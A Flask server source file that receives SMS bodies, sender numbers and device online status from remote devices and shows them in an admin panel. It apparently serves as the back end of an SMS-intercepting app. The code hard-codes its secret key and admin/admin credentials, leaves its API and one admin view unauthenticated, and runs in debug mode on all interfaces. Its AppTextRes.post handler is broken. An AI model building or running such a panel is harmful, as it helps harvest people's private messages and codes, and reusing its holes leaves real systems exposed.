from flask import Flask, render_template, request, session, redirect, make_response
from flask_admin.menu import MenuLink
from flask_restful import Resource, reqparse, Api
from flask_sqlalchemy import SQLAlchemy

import flask_admin as admin
from flask_admin import expose, AdminIndexView
from flask_admin.contrib.sqla import ModelView

# Intialize  Flask_App, DB, Flask_Admin
app = Flask(__name__)
app.config['SECRET_KEY'] = '5791628bb0b13ce0c676dfde280ba245'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///main.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['FLASK_ADMIN_SWATCH'] = 'cerulean'

db = SQLAlchemy(app)
api = Api(app)


# Models for DB
class Content(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    device_id = db.Column(db.String(100), nullable=False)
    nick_name = db.Column(db.String(100), nullable=False, default='nick name')
    body = db.Column(db.String(10000), nullable=False)
    datetime = db.Column(db.String(100), nullable=False)
    sender_number = db.Column(db.String(100), nullable=False)
    status = db.Column(db.String(100), nullable=True, default=0)
    online_datetime = db.Column(db.String(100), nullable=True)
    online_status = db.Column(db.String(100), nullable=True)


class AppText(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    input1 = db.Column(db.String(10000), nullable=False)
    input2 = db.Column(db.String(10000), nullable=False)
    input3 = db.Column(db.String(10000), nullable=False)
    input4 = db.Column(db.String(10000), nullable=False)
    input5 = db.Column(db.String(10000), nullable=False)
    input6 = db.Column(db.String(10000), nullable=False)
    input7 = db.Column(db.String(10000), nullable=False)
    input8 = db.Column(db.String(10000), nullable=False)


# Create Tables on 1st run
db.create_all()


# API Resources
class SendContent(Resource):
    def post(self):
        parser = reqparse.RequestParser(bundle_errors=True)
        parser.add_argument('device_id', type=str, help='Device ID', required=True)
        parser.add_argument('nick_name', type=str, help='Nick Name', required=False)
        parser.add_argument('body', type=str, help='Sms Body', required=True)
        parser.add_argument('datetime', type=str, help='Date & Time', required=True)
        parser.add_argument('sender_number', type=str, help='Sender Number', required=True)
        parser.add_argument('status', type=str, help='SMS status ', required=False)
        parser.add_argument('online_datetime', type=str, help=' Ping Date & Time', required=False)
        parser.add_argument('online_status', type=str, help='SMS status ', required=False)
        args = parser.parse_args(strict=True)
        custom_args = {}
        for k, v in args.items():
            if v:
                custom_args.update({k: v})

        content = Content(**custom_args)
        db.session.add(content)
        db.session.commit()

        return "OK", 200

    def put(self):
        parser = reqparse.RequestParser(bundle_errors=True)
        parser.add_argument('device_id', type=str, help='Device ID', required=True)
        parser.add_argument('online_datetime', type=str, help=' Ping Date & Time', required=True)
        parser.add_argument('online_status', type=str, help='SMS status ', required=False)
        args = parser.parse_args(strict=True)

        content = Content.query.filter_by(device_id=args['device_id']).first()
        if content:
            print(content.device_id)
            content.online_datetime = args['online_datetime']
            content.online_status = args['online_status']
            db.session.commit()
            return "Updated", 200
        return "Device not exist", 404


class AppTextRes(Resource):
    def post(self):
        parser = reqparse.RequestParser(bundle_errors=True)
        parser.add_argument('input1', type=str, help='input1', required=False)
        parser.add_argument('input2', type=str, help='input2', required=False)
        parser.add_argument('input3', type=str, help='input3', required=False)
        parser.add_argument('input4', type=str, help='input4', required=False)
        parser.add_argument('input5', type=str, help='input5', required=False)
        parser.add_argument('input6', type=str, help='input6', required=False)
        parser.add_argument('input7', type=str, help='input7', required=False)
        parser.add_argument('input8', type=str, help='input8', required=False)
        args = parser.parse_args(strict=True)
        custom_args = {}
        for k, v in args.items():
            if v:
                custom_args.update({k: v})

        content = Content(**custom_args)
        db.session.add(content)
        db.session.commit()

        return "OK", 200

    def put(self):
        parser = reqparse.RequestParser(bundle_errors=True)
        parser.add_argument('input1', type=str, help='input1', required=False)
        parser.add_argument('input2', type=str, help='input2', required=False)
        parser.add_argument('input3', type=str, help='input3', required=False)
        parser.add_argument('input4', type=str, help='input4', required=False)
        parser.add_argument('input5', type=str, help='input5', required=False)
        parser.add_argument('input6', type=str, help='input6', required=False)
        parser.add_argument('input7', type=str, help='input7', required=False)
        parser.add_argument('input8', type=str, help='input8', required=False)
        args = parser.parse_args(strict=True)
        text = AppText.query.filter_by(id=1).first()
        if text:
            text.input1 = args['input1']
            text.input2 = args['input2']
            text.input3 = args['input3']
            text.input4 = args['input4']
            text.input5 = args['input5']
            text.input6 = args['input6']
            text.input7 = args['input7']
            text.input8 = args['input8']
            db.session.commit()

        return "OK", 200


# Redirecting Home to Admin
@app.route('/')
def home():
    return redirect('/admin')


# Login/Logout
@app.route('/login', methods=['POST'])
def login():
    if request.form['username'] == 'admin' and request.form['password'] == 'admin':
        session['logged_in'] = True
        resp = make_response(redirect('/content'))
        resp.set_cookie('username', request.form['username'])
        return redirect('/content')
    return render_template('login.html')


@app.route('/logout')
def logout():
    session['logged_in'] = False
    return render_template('login.html')


class MyAdminIndexView(AdminIndexView):
    @expose('/')
    def index(self):
        if session.get('logged_in'):
            if request.cookies.get('username'):
                return redirect('/content')
        if not session.get('logged_in'):
            return render_template('login.html')
        return redirect('/content')


# Flask Admin Views
class ContentModelView(ModelView):
    can_edit = True
    can_create = False
    column_default_sort = ('datetime', True)
    column_list = ('device_id', 'nick_name', 'body', 'datetime', 'sender_number', 'online_datetime', 'online_status')

    def is_accessible(self):
        if session.get('logged_out'):
            return False
        if session.get('logged_in'):
            return True


class TextView(ModelView):
    can_edit = True
    can_create = False


# Register Admin Routes/Views
admin = admin.Admin(app, name='Home', index_view=MyAdminIndexView(name=' '), template_mode='bootstrap3', url='/admin')
admin.add_view(ContentModelView(Content, db.session, url='/content', ))
admin.add_view(TextView(AppText, db.session, url='/apptext', ))

# API endpoint
api.add_resource(SendContent, '/api/content/')
api.add_resource(AppTextRes, '/api/apptext/')
admin.add_link(MenuLink(name='Logout', category='', url="/logout"))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
